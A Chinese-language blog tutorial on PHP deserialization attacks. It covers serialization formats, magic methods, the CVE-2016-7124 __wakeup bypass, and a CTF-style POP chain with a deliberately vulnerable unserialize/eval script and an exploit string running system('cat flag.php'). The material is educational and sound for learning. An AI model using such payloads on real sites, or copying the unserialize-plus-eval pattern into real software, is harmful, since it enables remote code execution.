@@ -1,0 +1,436 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>PHP反序列化的学习 | 青雲</title>
+    <meta name="author" content="CKC" />
+    <meta name="description" content="记录日常学习与生活" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar1.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>青雲</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;青雲</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>PHP反序列化的学习</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/4/11
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/web/" style="color: #ff7d73">
+                    web
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="color: #00a596">
+                    学习
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>在学习PHP反序列化之前，我们先要了解以下几个知识点：(推荐使用<u><a target="_blank" rel="noopener" href="https://www.runoob.com/">菜鸟教程</a></u>进行学习)</p>
+<ul>
+<li><p>PHP的基本语法（进行代码审计的基础）</p>
+</li>
+<li><p>类与对象（PHP反序列化中涉及大量类与对象的相关知识）</p>
+</li>
+<li><p><del>中华人民共和国网络安全法（如何顺利地吃上国家饭）</del></p>
+</li>
+</ul>
+<hr>
+<p>在学习完了上面的内容之后，就可以开始PHP反序列化的学习<del>(折磨)</del>了</p>
+<p>首先是PHP序列化与反序列化的两个函数，这一篇章需要大量使用它们，如下所示：</p>
+<p><strong>PHP序列化函数： <code>serialize(mixed value):string</code></strong></p>
+<p>将PHP对象序列化之后，以字符串的形式返回,方便数据的存储，在 PHP 中，他们常被用到缓存、session、cookie 等地方。</p>
+<pre><code class="PHP">//各数据类型的序列化样例
+$i = 1;        //i:1;    整数
+$d = 1.1;    //d:1.1；    小数
+$n = NULL;    //N;    空值
+$b = true;    //b:1;    布尔型
+$s = &quot;hello&quot;    //s:5:&quot;hello&quot;;    字符串
+$a = array(&quot;hello&quot;,&quot;cyberspace&quot;)    //a:2:&#123;i:0;s:5:&quot;hello&quot;;i:1;s:10:&quot;cyberspace&quot;;&#125; 数组
+class A&#123;    //普通类
+  private $num = 10;
+  protected $f = flag;        
+  public $l = NULL;
+&#125;    //O:1:&quot;A&quot;:3:&#123;s:6:&quot;\0A\0num&quot;;i:10;s:4:&quot;\0*\0f&quot;;s:4:&quot;flag&quot;;s:1:&quot;l&quot;;N;&#125;
+</code></pre>
+<p>以上便是几种基础的数据类型序列化后的结果，更复杂的组合请自行去探索。（其实是懒得敲）</p>
+<p><strong>PHP反序列化函数：<code>unserialize(string $str):mixed</code></strong></p>
+<p>顾名思义，PHP反序列化就是PHP序列化的逆过程，所以在此也不进行过多赘述。</p>
+<hr>
+<h5 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h5><blockquote>
+<p>是开发者用来控制序列化与反序列化的一组特殊方法，标志是这类方法通常以双下划线__开头</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>触发时机</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>__construct()</td>
+<td>当对象被创建时触发</td>
+</tr>
+<tr>
+<td>__destruct()</td>
+<td>当对象被销毁时触发</td>
+</tr>
+<tr>
+<td>__wakeup()</td>
+<td>当对象被反序列化时触发</td>
+</tr>
+<tr>
+<td>__sleep()</td>
+<td>当对象被序列化时触发</td>
+</tr>
+<tr>
+<td>__toString()</td>
+<td>当对象被转换为字符串时触发</td>
+</tr>
+<tr>
+<td>__invoke()</td>
+<td>当对象被作为函数调用时触发</td>
+</tr>
+<tr>
+<td>__call()</td>
+<td>当调用对象中无法访问或不存在的方法时触发</td>
+</tr>
+<tr>
+<td>__callStatic()</td>
+<td>在静态上下文中，调用对象中无法访问或不存在的方法时触发</td>
+</tr>
+<tr>
+<td>__get()</td>
+<td>读取不存在或无法访问的属性时触发</td>
+</tr>
+<tr>
+<td>__set()</td>
+<td>将数据写入不可访问的属性时触发</td>
+</tr>
+<tr>
+<td>__isset()</td>
+<td>在不可访问的属性上调用isset()或empty()时触发</td>
+</tr>
+<tr>
+<td>__unset()</td>
+<td>在不可访问的属性上使用unset()时触发</td>
+</tr>
+</tbody></table>
+<p>以上便是比较常见的魔术方法，除去上面的还有一些其它的魔术方法，详情请见<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/">PHP官方文档</a>。</p>
+<hr>
+<h5 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h5><blockquote>
+<p>这里的话我只刷了hello-ctf的入门靶场，见识浅薄，勿骂。<br>靶场网站如下</p>
+</blockquote>
+<ul>
+<li>序列化的权限修饰</li>
+</ul>
+<p>通过前面给出的类的序列化示例，也能看出不同权限的属性序列化后属性名有所不同。这里也给出示例：</p>
+<pre><code class="PHP">class A&#123;
+    public $a = 1;
+    protected $b = 2;
+    private $c = 3;
+&#125;
+$Ac = new A();
+$As = serialize($Ac);
+echo $As;
+//输出：O:1:&quot;A&quot;:3:&#123;s:1:&quot;a&quot;;i:1;s:4:&quot;\0*\0b&quot;;i:2;s:4:&quot;\0A\0c&quot;;i:3;&#125;
+</code></pre>
+<p>可以看到序列化后公共属性显示为”属性名”，受保护属性显示为”\0*\0属性名”，私有属性显示为”\0类名\0属性名”，其中\0为不可见字符,在正常的输出中是不可见的。</p>
+<pre><code>echo urlencode($As);
+//输出：O%3A1%3A%22A%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bi%3A1%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A2%3Bs%3A4%3A%22%00A%00c%22%3Bi%3A3%3B%7D
+</code></pre>
+<p>所以通常来说，对序列化的结果进行url编码，防止不可见字符的丢失。</p>
+<p>通过上面的方法之后，我们就可以在序列化字符串中对受保护属性与私有属性进行修改。</p>
+<ul>
+<li>__wakeup()绕过(CVE-2016-7124)</li>
+</ul>
+<pre><code class="PHP">class FLAG&#123;
+    public $get_context;
+    public function __contruct()&#123;
+        $this -&gt; get_context = get_flag;
+    &#125;
+    public function __wakeup()&#123;
+        $this -&gt; get_context = NULL;
+    &#125;
+&#125;
+
+$flag = new FLAG();
+$serializeflag = serialize($flag);
+$unserializefalg = unserialize($serializeflag);
+if(!strcmp($unserializeflag,&quot;get_flag&quot;))&#123;	//strcmp()检查两个字符串是否相等，若相等，则返回0。
+    echo &#39;flag&#123;···&#125;&#39;
+&#125;
+</code></pre>
+<p>如上面所示，只有当反序列化后<strong>get_content的值</strong>等于<strong>get_flag</strong>的时候才会输出flag。</p>
+<p>我们通过观察可以发现类实例化时构造函数会将<strong>get_content的值</strong>初始化为<strong>get_flag</strong>，但在反序列化时__wakeup()会触发，将<strong>get_content</strong>重新初始化为NULL，所以我们主要考虑的时如何在反序列化时让__wakeup()不触发。</p>
+<p>这里我们使用CVE-2016-7124中的方法，我们在类序列化后的属性数量上+1，__wakeup()函数便不会触发，于是就绕过了__wakeup()。</p>
+<ul>
+<li>POP链的构造</li>
+</ul>
+<pre><code class="PHP">class A &#123;
+    public $a;
+    public function __construct($a) &#123;
+        $this-&gt;a = $a;
+    &#125;
+&#125;
+class B &#123;
+    public $b;
+    public function __construct($b) &#123;
+        $this-&gt;b = $b;
+    &#125;
+&#125;
+class D &#123;
+    public $d;
+    public function __construct($d) &#123;
+        $this-&gt;d = $d;
+    &#125;
+    public function __wakeUp() &#123;
+        $this-&gt;d-&gt;action();
+    &#125;
+&#125;
+class destnation &#123;
+    var $cmd;
+    public function __construct($cmd) &#123;
+        $this-&gt;cmd = $cmd;
+    &#125;
+    public function action()&#123;
+        eval($this-&gt;cmd-&gt;a-&gt;b);
+    &#125;
+&#125;
+
+if(isset($_POST[&#39;o&#39;])) &#123;
+    unserialize($_POST[&#39;o&#39;]);
+&#125; else &#123;
+    highlight_file(__FILE__);
+&#125;
+//改编自hello-ctf的PHP反序列化靶场level15（其实就只是减少一个类）
+</code></pre>
+<p>通过观察上面代码，我们需要构造一个类D的序列化字符串，通过其反序列化触发的__wakeup()去使用类destnation中的action()方法，在进一步的访问类A、类B，最后获取一个字符串，去进行命令执行。</p>
+<p>所以根据以上思路，构造exp如下:</p>
+<pre><code class="PHP">//假设flag.php在同级目录下
+$b = new B(&quot;system(&#39;cat flag.php&#39;);&quot;);
+$a = new A($b);
+$des = new destnation($a);
+$d = new D($des);
+$exp = serialize($d);
+echo &quot;o=&quot;.$exp;
+//输出：o=O:1:&quot;D&quot;:1:&#123;s:1:&quot;d&quot;;O:10:&quot;destnation&quot;:1:&#123;s:3:&quot;cmd&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:23:&quot;system(&#39;cat flag.php&#39;);&quot;;&#125;&#125;&#125;&#125;
+</code></pre>
+<p>通过上面的构造，就可以成功地进行命令执行，获取flag。</p>
+<ul>
+<li>字符串逃逸</li>
+</ul>
+<h2 id="施工中ing"><a href="#施工中ing" class="headerlink" title="施工中ing~~~"></a><center>施工中ing~~~</center></h2><h3 id="前面的区域以后再来探索吧"><a href="#前面的区域以后再来探索吧" class="headerlink" title="前面的区域以后再来探索吧"></a><center>前面的区域以后再来探索吧</center></h3>
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2026 - 2026 青雲
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;CKC
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
